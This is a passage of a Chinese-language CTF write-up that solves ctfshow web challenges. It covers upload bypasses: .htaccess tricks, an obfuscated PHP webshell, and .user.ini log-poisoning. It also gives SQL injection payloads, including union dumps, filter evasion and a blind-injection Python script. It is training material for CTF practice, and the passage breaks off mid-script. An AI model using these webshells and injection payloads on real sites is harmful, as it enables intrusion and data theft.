</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">        <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">
</span></span><span class="line"><span class="ln">106</span><span class="cl">    <span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">        <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">                <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">
</span></span><span class="line"><span class="ln">116</span><span class="cl">    <span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">        <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">        <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl">
</span></span><span class="line"><span class="ln">121</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">
</span></span><span class="line"><span class="ln">134</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">            <span class="nv">$byte</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl">            <span class="k">return</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">
</span></span><span class="line"><span class="ln">151</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">            <span class="nv">$short</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">            <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">
</span></span><span class="line"><span class="ln">165</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">            <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>jpgå›¾ç‰‡æ¯”è¾ƒè„†å¼±ï¼ŒæˆåŠŸç‡å¾ˆä½ï¼Œæˆ‘è¯•äº†åå¤šå¼ å›¾ç‰‡éƒ½æ²¡æˆåŠŸ</p>
<h4 id="web166">web166<a hidden class="anchor" aria-hidden="true" href="#web166">#</a></h4>
<p>zipæ³¨å…¥</p>
<p>è¿™é¢˜åªèƒ½ä¸Šä¼ zipï¼Œä¸Šä¼ åä¼šå‡ºç°æŸ¥çœ‹æ–‡ä»¶ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<p>æœ¬è´¨ä¸Šå°±æ˜¯åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç </p>
<p><img alt="image-20250128184205535" loading="lazy" src="./assets/image-20250128184205535.png"></p>
<h4 id="web167">web167<a hidden class="anchor" aria-hidden="true" href="#web167">#</a></h4>
<p>.htaccessæ–‡ä»¶åˆ©ç”¨</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯.htaccessï¼Ÿ</p>
<p>htaccessæ–‡ä»¶æ˜¯<a href="https://baike.baidu.com/item/Apache/0?fromModule=lemma_inlink">Apache</a>æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91/1135400?fromModule=lemma_inlink">301é‡å®šå‘</a>ã€è‡ªå®šä¹‰<a href="https://baike.baidu.com/item/404%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2/583066?fromModule=lemma_inlink">404é”™è¯¯é¡µé¢</a>ã€æ”¹å˜<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/1270230?fromModule=lemma_inlink">æ–‡ä»¶æ‰©å±•å</a>ã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote>
<p>å¦‚æœæœåŠ¡å™¨å¼€å¯äº†.htaccessï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨.htaccesså°†jpgæˆ–è€…pngç­‰åç¼€çš„æ–‡ä»¶ï¼Œä½œä¸ºphpæ–‡ä»¶è§£æ</p>
<pre tabindex="0"><code>AddType/AddHandler application/x-httpd-php &#34;.jpg&#34;
</code></pre><p>ç”±äºæœ‰å‰ç«¯éªŒè¯ï¼Œæˆ‘ä»¬è¦å…ˆæŠŠç¼–å†™å¥½çš„.htaccessæ–‡ä»¶æ”¹ä¸º.jpgåç¼€</p>
<p>å†é€šè¿‡æŠ“åŒ…å°†æ–‡ä»¶åä¿®æ”¹ä¸º.htaccess</p>
<p><img alt="image-20250129181407357" loading="lazy" src="./assets/image-20250129181407357.png"></p>
<p>æ¥ç€ä¸Šä¼ æˆ‘ä»¬å†™å¥½çš„ä¸€å¥è¯æœ¨é©¬(åç¼€ä¸º.jpg)</p>
<p><img alt="image-20250129181144016" loading="lazy" src="./assets/image-20250129181144016.png"></p>
<p><img alt="image-20250129181548565" loading="lazy" src="./assets/image-20250129181548565.png"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å·²ç»è¢«æˆåŠŸæ‰§è¡Œäº†</p>
<h4 id="web168">web168<a hidden class="anchor" aria-hidden="true" href="#web168">#</a></h4>
<p>åŸºç¡€å…æ€</p>
<p><img alt="image-20250129233605531" loading="lazy" src="./assets/image-20250129233605531.png"></p>
<p>è¿™é¢˜æ²¡æœ‰é™åˆ¶æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥ä¸Šä¼ php</p>
<p>åº”è¯¥æ˜¯å¯¹å…³é”®è¯æœ‰è¿‡æ»¤</p>
<p><img alt="image-20250129235142888" loading="lazy" src="./assets/image-20250129235142888.png"></p>
<p>ç®€å•æ‹¼æ¥ä¸€ä¸‹è¯•è¯•ï¼Œæ²¡æƒ³åˆ°ç›´æ¥æˆåŠŸäº†</p>
<p>payload</p>
<pre tabindex="0"><code>&lt;?php $a=&#34;sys&#34;.&#34;tem&#34;; $a($_REQUEST[1]);?
</code></pre><pre tabindex="0"><code>GET 1=tac%20../flagaa.php
</code></pre><h4 id="web169">web169<a hidden class="anchor" aria-hidden="true" href="#web169">#</a></h4>
<p>.user.iniæ–‡ä»¶åŒ…å«</p>
<p><strong>å‰ç«¯åšäº†æ ¡éªŒåªèƒ½ä¼ <code>zip</code>æ–‡ä»¶,åç«¯åˆåšäº†å›¾ç‰‡æ–‡ä»¶æ£€æŸ¥(éœ€è¦æ”¹æˆimage/png).è¿‡æ»¤äº†<code>&lt;&gt;</code>å’Œ<code>php</code></strong></p>
<p><strong>å…ˆä¸Šä¼ ä¸€ä¸ª<code>index.php</code>ï¼Œç„¶ååˆ©ç”¨æ—¥å¿—åŒ…å«ï¼Œä¸Šä¼ <code>.user.ini</code> å†™å…¥ä»¥ä¸‹å†…å®¹è¿›è¡ŒåŒ…å«ç„¶å<code>UA</code>é‡Œé¢å†™æœ¨é©¬</strong></p>
<pre tabindex="0"><code>auto_append_file=&#34;/var/log/nginx/access.log&#34;

&lt;?=system(&#39;cat ../flagaa.php&#39;)?&gt;
</code></pre><p><img alt="image-20250130090337705" loading="lazy" src="./assets/image-20250130090337705.png"></p>
<h4 id="web170">web170<a hidden class="anchor" aria-hidden="true" href="#web170">#</a></h4>
<p>è¿™é¢˜å’Œweb169è§£æ³•ä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«</p>
<h3 id="sqlæ³¨å…¥">sqlæ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#sqlæ³¨å…¥">#</a></h3>
<h4 id="æ— è¿‡æ»¤æ³¨å…¥å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤"><strong>æ— è¿‡æ»¤æ³¨å…¥</strong>ï¼ˆå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼‰<a hidden class="anchor" aria-hidden="true" href="#æ— è¿‡æ»¤æ³¨å…¥å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤">#</a></h4>
<h4 id="web171">web171<a hidden class="anchor" aria-hidden="true" href="#web171">#</a></h4>
<pre tabindex="0"><code>$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
</code></pre><p>flagæ˜¯å­˜åœ¨äºusernameä¸ºflagçš„ç”¨æˆ·çš„æ•°æ®ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡</p>
<pre tabindex="0"><code>1&#39; or 1=1 --+
</code></pre><p>å³å¯è¾“å‡ºæ‰€æœ‰ç”¨æˆ·æ•°æ®</p>
<h4 id="web172">web172<a hidden class="anchor" aria-hidden="true" href="#web172">#</a></h4>
<p>ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œè¿™é¢˜å¢åŠ äº†è¿‡æ»¤</p>
<pre tabindex="0"><code>//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag
if($row-&gt;username!==&#39;flag&#39;){
      $ret[&#39;msg&#39;]=&#39;æŸ¥è¯¢æˆåŠŸ&#39;;
    }
</code></pre><p>æ–¹æ³•ä¸€: è”åˆæŸ¥è¯¢</p>
<p>å› ä¸ºè”åˆæŸ¥è¯¢åªä¼šæ˜¾ç¤ºpassword</p>
<pre tabindex="0"><code>api/?id=1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

/api/?id=1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),database()%23

/api/?id=1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;ctfshow_web&#39; and table_name=&#39;ctfshow_user&#39;),database()%23

//çœ‹åˆ°æœ‰3åˆ— id,username,password

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

//æŸ¥è¯¢passwordå‘ç°æ²¡æœ‰flag

//æŸ¥å¦ä¸€ä¸ªè¡¨ ctfshow_user2

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

//çœ‹åˆ°flag
</code></pre><p>æ–¹æ³•äºŒ: å°†ç”¨æˆ·åå­—æ®µè¿›è¡Œç¼–ç ï¼Œç»•è¿‡æ£€æµ‹</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user2 --+
</code></pre><p>æ–¹æ³•ä¸‰: åªæŸ¥è¯¢å¯†ç </p>
<pre tabindex="0"><code>-1&#39; union select id,password from ctfshow_user2 where username=&#39;flag
</code></pre><h4 id="web173">web173<a hidden class="anchor" aria-hidden="true" href="#web173">#</a></h4>
<p>è¿‡æ»¤è¦æ±‚æŸ¥è¯¢ç»“æœä¸­ä¸èƒ½å‡ºç°flagå­—æ®µ</p>
<pre tabindex="0"><code>//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag
    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;æŸ¥è¯¢æˆåŠŸ&#39;;
    }
</code></pre><p>æ–¹æ³•ä¸€ï¼šè”åˆæŸ¥è¯¢</p>
<p>å’Œä¸Šé¢˜è§£æ³•ä¸€æ ·ï¼Œåªæ˜¯è¿™é¢˜flagåœ¨ctfshow_user3</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>åªæŸ¥è¯¢password</p>
<pre tabindex="0"><code>-1&#39; union select id,id,password from ctfshow_user3 where username=&#39;flag
</code></pre><p>æ–¹æ³•ä¸‰: å°†ç”¨æˆ·åå­—æ®µè¿›è¡Œç¼–ç ï¼Œç»•è¿‡æ£€æµ‹</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user3 --+
</code></pre><h4 id="web174">web174<a hidden class="anchor" aria-hidden="true" href="#web174">#</a></h4>
<p>è¾“å‡ºæ—¶å¢åŠ äº†è¿‡æ»¤æ•°å­—</p>
<pre tabindex="0"><code>//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flagå’Œæ•°å­—
    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;æŸ¥è¯¢æˆåŠŸ&#39;;
}     
</code></pre><p>ç”±äºflagä¸­å«æœ‰æ•°å­—ï¼Œå“ªæ€•åƒä¹‹å‰çš„é€šè¿‡to_base64ç­‰ç¼–ç åï¼Œä»ç„¶ä¸å¯é¿å…æ•°å­—çš„å‡ºç°</p>
<p>æ‰€ä»¥è¿™é¢˜æˆ‘ä»¬è¦ç”¨åˆ°å¸ƒå°”ç›²æ³¨</p>
<p>æ”¾ä¸ªè„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,1,0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>åˆæˆ–è€…é€šè¿‡replaceæ–¹æ³•å°†æ•°å­—æ›¿æ¢æˆå…¶ä»–çš„åˆæ³•å­—ç¬¦</p>
<pre tabindex="0"><code>1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;A&#39;),2,&#39;B&#39;),3,&#39;C&#39;),4,&#39;D&#39;),5,&#39;E&#39;),6,&#39;F&#39;),7,&#39;G&#39;),8,&#39;H&#39;),9,&#39;I&#39;),0,&#39;J&#39;),&#39;b&#39; from ctfshow_user4 where username=&#39;flag&#39; %23
</code></pre><p><img alt="image-20250206225601177" loading="lazy" src="./assets/image-20250206225601177.png"></p>
<p>æ‹¿åˆ°flagåæ›¿æ¢å›å»å°±è¡Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> 
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">flag64</span> <span class="o">=</span> <span class="s2">&#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}&#34;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"> 
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">flag64</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;H&#34;</span><span class="p">,</span> <span 